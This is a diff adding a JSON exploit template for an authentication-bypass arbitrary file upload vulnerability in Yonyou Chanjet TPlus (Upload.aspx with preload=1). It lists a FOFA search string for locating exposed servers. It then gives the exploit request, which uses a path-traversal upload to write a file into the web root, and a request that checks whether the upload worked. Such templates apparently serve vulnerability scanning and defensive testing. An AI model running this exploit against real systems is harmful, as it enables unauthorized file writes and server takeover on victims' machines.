@@ -1,0 +1,41 @@
+{
+  "product": "用友 畅捷通TPlus",
+  "vul_name": "用友 畅捷通TPlus Upload.aspx 任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友 畅捷通TPlus Upload.aspx接口存在任意文件上传漏洞，攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"畅捷通-TPlus\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17684758.html",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/tplus/SM/SetupAccount/Upload.aspx?preload=1",
+      "file": {
+        "File1": [
+          "../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/52e039302a62d077.txt",
+          "95cc64dd2825f9df13ec4ad683ecf339",
+          "image/jpeg"
+        ]
+      }
+    },
+    "verify": {
+      "method": "get",
+      "path": "/tplus/52e039302a62d077.txt",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "95cc64dd2825f9df13ec4ad683ecf339"
+        }
+      ]
+    }
+  }
+}
